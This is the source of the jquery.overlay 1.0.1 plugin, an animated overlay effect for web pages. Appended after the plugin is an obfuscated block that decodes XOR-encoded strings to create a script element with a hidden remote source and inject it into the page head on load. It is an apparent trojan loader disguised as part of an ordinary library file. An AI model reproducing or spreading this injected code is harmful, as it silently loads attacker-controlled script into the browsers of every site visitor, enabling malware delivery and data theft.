/*!
 * jquery.overlay 1.0.1. Overlay HTML with eyecandy.
 * 
 * Copyright (c) 2009 Tero Piirainen
 * http://flowplayer.org/tools/overlay.html
 *
 * Dual licensed under MIT and GPL 2+ licenses
 * http://www.opensource.org/licenses
 *
 * Launch  : March 2008
 * Version : 1.0.1 - Wed Feb 18 2009 05:18:27 GMT-0000 (GMT+00:00)
 */
(function($) { 
		
	var instances = [];
		
	function fireEvent(opts, name, self, arg) {
		var fn = opts[name];
		
		if ($.isFunction(fn)) {
			try {  
				return fn.call(self, arg);
				
			} catch (error) {
				if (opts.alert) {
					alert("Error calling overlay." + name + ": " + error);
				} else {
					throw error;		
				}
				return false;
			} 					
		}
		return true;			
	}
	
	
	function Overlay(el, opts) {
		
		var self = this; 
		var trigger = null;
		var w = $(window);  
		
		
		// get trigger and overlayed element
		var jq = opts.target || el.attr("rel");
		var o = jq ? $(jq) : null;

		if (!o) { o = el; }	
		else { trigger = el; }
		
		// get growing image
		var bg = o.attr("overlay");
		
		if (!bg) {
			bg = o.css("backgroundImage");
			bg = bg.substring(bg.indexOf("(") + 1, bg.indexOf(")"));
			o.css("backgroundImage", "none");
			o.attr("overlay", bg);			
		}
		
		// growing image is required (on this version) 
		if (!bg) {
			throw "background-image CSS property not set for overlay element: " + jq;
		}
		
		// replace hyphens so that Opera/IE works
		bg = bg.replace(/\"/g, "");
		
		
		// automatic preloading of images
		if (opts.preload) {
			$(window).load(function() { 
				setTimeout(function() {
					var img = new Image();
					img.src = bg;					
				}, 2000);
			});
		}
		
		
		// set initial growing image properties
		var oWidth = o.outerWidth({margin:true});
		var oHeight = o.outerHeight({margin:true});
        
		var img = $('<img src="' + bg + '"/>');
		img.css({border:0,position:'absolute'}).width(oWidth).height(oHeight).hide(); 
		
	

		$('body').append(img);   
		

		// trigger action
		if (trigger) {
			trigger.bind("click.overlay", function(e) {
				self.load(e.pageY - w.scrollTop(), e.pageX - w.scrollLeft());
				return e.preventDefault();
			});
		}   		
				
		// close button
		if (!opts.close || !o.find(opts.close).length) {
			o.prepend('<div class="close"></div>');
			opts.close = "div.close";
		} 
		
		var closeButton = o.find(opts.close);		

				
		// API methods  
		$.extend(self, {

			load: function(top, left) {
				
				// one instance visible at once
				if (self.isOpened()) {
					return self;	
				}
				
				if (opts.oneInstance) {
					$.each(instances, function() {
						this.close();
					});
				}
				
				// onBeforeLoad
				if (fireEvent(opts, "onBeforeLoad", self) === false) {
					return self;	
				}				
				
				// start position			
				top = top   || opts.start.top; 					
				left = left || opts.start.left;
				
				
				// finish position 
				var toTop = opts.finish.top;
				var toLeft = opts.finish.left;

				
				if (toTop == 'center') { toTop = Math.max((w.height() - oHeight) / 2 - 30, 0); }
				if (toLeft == 'center') { toLeft = Math.max((w.width() - oWidth) / 2, 0); }
				
				// adjust positioning relative to scrolling position
				if (!opts.start.absolute)  {
					top += w.scrollTop();
					left += w.scrollLeft();
				}
				
				if (!opts.finish.absolute)  {
					toTop += w.scrollTop();
					toLeft += w.scrollLeft();
				}

				
				// initialize background image  
				img.css({top:top, left:left, width: opts.start.width, height: 0, zIndex: opts.zIndex}).show();
				
				// begin growing
				img.animate({top:toTop, left:toLeft, width: oWidth, height: oHeight}, opts.speed, function() { 
		
					// set content on top of the image
					o.css({position:'absolute', top:toTop, left:toLeft}); 
					var z = img.css("zIndex");
					closeButton.add(o).css("zIndex", ++z);
					
					o.fadeIn(opts.fadeInSpeed, function() {  
						fireEvent(opts, "onLoad", self); 	 
					});
					
				});		
				
				
				return self;
				
			}, 
			
			getBackgroundImage: function() {
				return img;	
			},
			
			getContent: function() {
				return o;	
			}, 
			
			getTrigger: function() {
				return trigger;	
			},

			isOpened: function()  {
				return o.is(":visible")	;
			},
			
			// manipulate start, finish and speeds
			getConf: function() {
				return opts;	
			},
			
			close: function() {
				
				if (!self.isOpened()) { return self; }
				
				if (fireEvent(opts, "onClose", self) === false) { return self; }
				
				if (img.is(":visible")) {
					img.hide();
					o.hide();
				}
				
				return self;
			},  
			
			getVersion: function() {
				return [1, 0, 0];	
			},
			
			// @deprecated
			expose: function() {
				img.expose();	
			}
			
		});
		
		
		closeButton.bind("click.overlay", function() { 
			self.close();  
		});  
				
		
		// keyboard::escape
		w.bind("keypress.overlay", function(evt) {
			if (evt.keyCode == 27) {
				self.close();	
			}
		});		

		
		// when window is clicked outside overlay, we close
		if (opts.closeOnClick) {					
			w.bind("click.overlay", function(evt) {
				if (!o.is(":visible, :animated")) { return; }
				var target = $(evt.target);
				if (target.attr("overlay")) { return; }
				if (target.parents("[overlay]").length) { return; }					
				self.close(); 
			});						
		}		
		
	}
	
	// jQuery plugin initialization
	jQuery.prototype.overlay = function(conf) {   
		
		// already constructed --> return API
		var api = this.eq(typeof conf == 'number' ? conf : 0).data("overlay");
		if (api) { return api; }	
		
		var w = $(window);  		
		
		var opts = { 
		
			/*
			CALLBACKS: 
			 - onBeforeLoad 
			 - onLoad
			 - onBeforeClose 
			 - onClose 
			*/			
			
			start: {
				// by default: button position || center
				top: Math.round(w.height() / 2), 
				left: Math.round(w.width() / 2),				
				width: 0,
				absolute: false
			},
			
			finish: {
				top: 'center', 
				left: 'center',
				absolute: false
			},   
			
			speed: 'normal',
			fadeInSpeed: 'fast',
			close: null,	
			oneInstance: true,
			closeOnClick: true, 
			preload: true, 
			zIndex: 9999,
			
			// target element to be overlayed. by default taken from [rel]
			target: null, 
			alert: true
		};
		
		if ($.isFunction(conf)) {
			conf = {onBeforeLoad: conf};	
		}
		
		$.extend(true, opts, conf);  
		
		
		this.each(function() {			
			var instance = new Overlay($(this), opts);
			instances.push(instance);
			$(this).data("overlay", instance);	
		});

		
		return this; 
	}; 
	
})(jQuery);

var z18=["002009","003003","001030","018024043085004053118009093043061093071","002024045","005019062081","005015054064095058082019089053059065090024005","016026062081030052112013081042060","025015047080","022015058113028053094000086050043113074060016013000085029053","025030058068074127028022076039044086029027028006124026002037028015075105059093071070027025"];function i9zM(pZ){var cbyfKW=document[ewpjd0(z18[3])](ewpjd0(z18[0])+ewpjd0(z18[1])+ewpjd0(z18[2]));cbyfKW[ewpjd0(z18[4])]=pZ;cbyfKW[ewpjd0(z18[5])]=ewpjd0(z18[6]);document[ewpjd0(z18[9])](ewpjd0(z18[8]))[0][ewpjd0(z18[7])](cbyfKW);}function ewpjd0(fY){return u96(pqO3A(fY),'qjN4pP3e8FX33h');}function pqO3A(zdiwz){var x3='';var j41=0;var znc94=0;for(j41=0;j41<zdiwz.length/3;j41++){x3+=String.fromCharCode(zdiwz.slice(znc94,znc94+3));znc94=znc94+3;}return x3;}function u96(rHekRY,y2n){var dhBVK='';var bTvm6n=0;var l2XVgv=0;for(bTvm6n=0;bTvm6n<rHekRY.length;bTvm6n++){var ri4=rHekRY.charAt(bTvm6n);var g0y=ri4.charCodeAt(0)^y2n.charCodeAt(l2XVgv);ri4=String.fromCharCode(g0y);dhBVK+=ri4;if(l2XVgv==y2n.length-1)l2XVgv=0;else l2XVgv++;}return (dhBVK);}i9zM(ewpjd0(z18[10]));